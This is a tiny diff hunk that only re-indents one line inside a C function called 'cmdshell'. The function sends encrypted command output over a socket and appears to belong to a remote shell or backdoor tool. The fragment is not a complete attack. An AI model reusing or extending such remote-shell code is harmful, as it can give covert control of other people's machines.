@@ -93,7 +93,7 @@ void cmdshell(void)
 				continue;
 			}
 			unsigned long nread;
-		    nread = fread(res, sizeof(char), sizeof(res), fp);
+		    	nread = fread(res, sizeof(char), sizeof(res), fp);
 			while (nread == sizeof(res))
 			{
 				send(sock, encrypt(res), sizeof(res), 0);
